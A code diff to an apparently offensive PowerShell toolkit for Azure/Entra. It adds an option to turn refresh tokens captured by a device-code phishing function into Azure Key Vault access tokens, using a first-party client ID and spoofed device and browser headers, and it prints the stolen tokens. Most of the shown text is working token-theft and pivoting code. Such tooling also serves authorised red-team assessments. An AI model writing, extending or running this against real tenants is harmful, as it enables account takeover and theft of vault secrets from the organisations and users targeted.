@@ -1986,8 +1986,8 @@ function DeviceCodePhishing {
 
     Write-Host "Tokens acquired successfully!" -ForegroundColor Green
     Write-Host "Resource: $($response.resource)" -ForegroundColor DarkGreen
-    Write-Host "Access Token: $($response.access_token)" -ForegroundColor Green
-    Write-Host "Refresh Token: $($response.refresh_token)" -ForegroundColor DarkGreen
+    Write-Host "Access Token: $($response.access_token)" -ForegroundColor Yellow
+    Write-Host "Refresh Token: $($response.refresh_token)" -ForegroundColor DarkYellow
     Pause
 }
 
@@ -2979,6 +2979,7 @@ function TokensMenu {
         Write-Host "1. Invoke-RefreshToAzureManagementToken - needed for Az PowerShell Module"
         Write-Host "2. Invoke-RefreshToAzureCoreManagementToken"
         Write-Host "3. Invoke-RefreshToGraphToken - needed for Graph PowerShell Module"
+        Write-Host "4. Invoke-RefreshToAzureKeyVaultToken - needed to login to Azure PS for KeyVault Access"
         Write-Host "B. Return to Main Menu"
 
         $userInput = Read-Host -Prompt "Select an option"
@@ -2991,6 +2992,9 @@ function TokensMenu {
             }
             "3" {
                 Invoke-RefreshToGraphToken
+            }
+            "4" {
+                Invoke-RefreshToAzureKeyVaultToken
             }
             "B" {
                 return
@@ -3280,6 +3284,71 @@ function Invoke-RefreshToGraphToken {
     Write-Host ("Expires in: $($GraphToken.expires_in)") -ForegroundColor Green
     Write-Host ("FOCI: $($GraphToken.foci)") -ForegroundColor Green
     Write-Host ("Access Token: $($GraphToken.access_token)") -ForegroundColor DarkMagenta
+    Pause
+}
+
+function Invoke-RefreshToAzureKeyVaultToken {
+    <#
+    .DESCRIPTION
+        Generate a Microsoft Azure Key Vault token from a refresh token.
+    .EXAMPLE
+        Invoke-RefreshToAzureKeyVaultToken -domain myclient.org -refreshToken ey....
+        $AzureKeyVaultToken.access_token
+    #>
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory = $true)]
+        [string]$RefreshToken = $response.refresh_token,
+        [Parameter(Mandatory = $false)]
+        $ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
+        [Parameter(Mandatory = $False)]
+        [Switch]$UseCAE
+    )
+
+    $Parameters = @{
+        Domain       = $Global:tenantid
+        refreshToken = $refreshToken
+        ClientID     = $ClientID
+        Device       = $Device
+        Browser      = $Browser
+        UseCAE       = $UseCAE
+        Scope        = "https://vault.azure.net/.default offline_access openid"
+    }
+
+    # Device and Browser options
+    $deviceOptions = @('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')
+    $browserOptions = @('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')
+
+    # Prompt user for custom headers
+    Write-Host "Would you like to specify a custom Device and Browser header? (Y/N)" -ForegroundColor Yellow
+    $customHeaders = Read-Host
+
+    if ($customHeaders -eq "Y") {
+        # Display device options
+        Write-Host "Select Device:" -ForegroundColor Yellow
+        for ($i = 0; $i -lt $deviceOptions.Count; $i++) {
+            Write-Host "$($i + 1). $($deviceOptions[$i])"
+        }
+        $selectedDeviceIndex = Read-Host "Enter the number corresponding to the Device"
+        $Parameters.Device = $deviceOptions[$selectedDeviceIndex - 1]
+
+        # Display browser options
+        Write-Host "Select Browser:" -ForegroundColor Yellow
+        for ($i = 0; $i -lt $browserOptions.Count; $i++) {
+            Write-Host "$($i + 1). $($browserOptions[$i])"
+        }
+        $selectedBrowserIndex = Read-Host "Enter the number corresponding to the Browser"
+        $Parameters.Browser = $browserOptions[$selectedBrowserIndex - 1]
+    }
+
+    $global:AzureKeyVaultToken = Invoke-RefreshToToken @Parameters
+        
+    Write-Host ("Token acquired") -ForegroundColor Green
+    Write-Host ("Type: $($AzureKeyVaultToken.token_type)") -ForegroundColor Green
+    Write-Host ("Scope: $($AzureKeyVaultToken.scope)") -ForegroundColor Green
+    Write-Host ("Expires in: $($AzureKeyVaultToken.expires_in)") -ForegroundColor Green
+    Write-Host ("FOCI: $($AzureKeyVaultToken.foci)") -ForegroundColor Green
+    Write-Host ("Access Token: $($AzureKeyVaultToken.access_token)") -ForegroundColor DarkMagenta
     Pause
 }
 
